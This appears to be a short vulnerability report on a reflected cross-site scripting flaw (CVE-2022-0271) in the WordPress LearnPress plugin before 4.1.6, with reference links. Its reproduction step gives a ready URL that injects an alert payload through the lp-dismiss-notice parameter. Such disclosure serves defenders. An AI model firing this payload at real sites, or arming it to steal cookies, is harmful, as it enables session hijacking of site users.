## Cross-Site Scripting
 
 WordPress LearnPress plugin before 4.1.6 contains a cross-site scripting vulnerability. It does not sanitize and escape the lp-dismiss-notice before outputting it back via the lp_background_single_email AJAX action.
 


## Steps To Reproduce

 Go to this  URL  
 ```
 https://$DOMAIN/wp-admin/admin-ajax.php?action=lp_background_single_email&lp-dismiss-notice=xxx<img%20src=x%20onerror=alert(document.domain)>
 ```
 

## Impact

 -  Perform any action within the application that the user can perform.
-   View any information that the user is able to view.
-   Modify any information that the user is able to modify.
-   Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user..
- Steal user's cookie. 

 
### Supporting Material/References
* https://nvd.nist.gov/vuln/detail/cve-2022-0271
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0271
* https://nvd.nist.gov/vuln/detail/cve-2022-0271
